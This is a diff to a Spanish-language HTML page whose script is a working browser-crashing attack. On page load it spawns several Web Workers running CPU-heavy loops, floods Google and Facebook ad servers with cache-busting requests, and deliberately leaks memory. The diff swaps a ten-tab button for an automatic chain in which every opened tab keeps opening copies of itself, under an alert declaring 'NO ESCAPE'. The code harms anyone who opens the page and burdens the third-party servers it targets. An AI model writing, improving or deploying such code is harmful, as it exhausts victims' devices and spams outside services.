@@ -21,15 +21,6 @@ h1{
   font-size:2.8rem;
   margin:30px;
 }
-button{
-  padding:15px 40px;
-  font-size:1.5rem;
-  background:#900;
-  color:white;
-  border:2px solid red;
-  margin-top:20px;
-  cursor:pointer;
-}
 @keyframes blink{ 50%{ opacity:0.1; } }
 </style>
 </head>
@@ -40,13 +31,12 @@ button{
 <canvas id="c1" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.25;"></canvas>
 <canvas id="c2" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.2;"></canvas>
 
-<button onclick="abrir10Pestanas()">🔥 ABRIR 10 PESTAÑAS 🔥</button>
-
 <script>
 let total = 0;
 let running = true;
+let instancia = 1; // Para identificar cada pestaña
 
-// Matrix
+// Matrix Rain
 function createMatrix(id, speed) {
   const canvas = document.getElementById(id);
   const ctx = canvas.getContext("2d");
@@ -74,18 +64,18 @@ function createMatrix(id, speed) {
 createMatrix("c1", 22);
 createMatrix("c2", 16);
 
-// Workers y Spam (sin cambios)
+// Carga pesada
 function createWorker() {
   const code = `
     self.onmessage = () => {
       setInterval(() => {
-        for(let i = 0; i < 8; i++) {
+        for(let i = 0; i < 7; i++) {
           fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?t=" + Date.now() + Math.random(),
           {mode:"no-cors", cache:"no-store"}).catch(()=>{});
         }
         let x = 0;
-        for(let j = 0; j < 80000; j++) x += Math.random() * Math.sin(j);
-      }, 5);
+        for(let j = 0; j < 75000; j++) x += Math.random() * Math.sin(j);
+      }, 6);
     };
   `;
   const blob = new Blob([code], {type: "application/javascript"});
@@ -95,7 +85,13 @@ function createWorker() {
 
 function spamPrincipal() {
   if (!running) return;
-  const urls = ["https://securepubads.g.doubleclick.net/tag/js/gpt.js","https://connect.facebook.net/en_US/fbevents.js","https://googleads.g.doubleclick.net/pagead/ads"];
+
+  const urls = [
+    "https://securepubads.g.doubleclick.net/tag/js/gpt.js",
+    "https://connect.facebook.net/en_US/fbevents.js",
+    "https://googleads.g.doubleclick.net/pagead/ads"
+  ];
+
   urls.forEach(url => {
     for(let i = 0; i < 5; i++) {
       const cb = "?t=" + Date.now() + Math.random();
@@ -103,35 +99,45 @@ function spamPrincipal() {
       new Image().src = url + cb;
     }
   });
-  window.leakArray = (window.leakArray || []).concat(new Array(8000).fill({data: Math.random()}));
+
+  window.leakArray = (window.leakArray || []).concat(new Array(7000).fill({data: Math.random()}));
+
   total++;
   const porcentaje = Math.min(100, Math.floor(total / 5));
   document.getElementById("contador").innerText = `CPU/RAM siendo violada: ${porcentaje}%`;
-  setTimeout(spamPrincipal, 8);
+
+  setTimeout(spamPrincipal, 9);
 }
 
-function abrir10Pestanas() {
-  for(let i = 0; i < 10; i++) {
-    try {
-      window.open(window.location.href, "_blank");
-    } catch(e) {}
-  }
+// === EFECTO CADENA ===
+function abrirNuevaPestana() {
+  try {
+    window.open(window.location.href, "_blank");
+  } catch(e) {}
 }
 
-// INICIO AUTOMÁTICO
+// INICIO AUTOMÁTICO CON CADENA
 window.onload = function() {
-  for(let i = 0; i < 8; i++) createWorker();
+  for(let i = 0; i < 7; i++) createWorker();
 
-  for(let i = 0; i < 100; i++) {
-    setTimeout(spamPrincipal, i * 10);
+  for(let i = 0; i < 80; i++) {
+    setTimeout(spamPrincipal, i * 12);
   }
   spamPrincipal();
 
-  // Intento automático después de 1.2 segundos
-  setTimeout(abrir10Pestanas, 1200);
+  // Cadena: cada pestaña abre otra
+  setTimeout(abrirNuevaPestana, 900);   // Primera apertura
 
-  // Intento cada 12 segundos
-  setInterval(abrir10Pestanas, 12000);
+  // Cada pestaña seguirá abriendo más cada 4-7 segundos
+  setInterval(() => {
+    if (Math.random() > 0.4) {   // No siempre abre para no saturar demasiado rápido
+      abrirNuevaPestana();
+    }
+  }, 4500);
+
+  setTimeout(() => {
+    alert("☢ NO ESCAPE ACTIVADO ☢\n\nCada pestaña abrirá más...");
+  }, 800);
 };
 </script>
 </body>
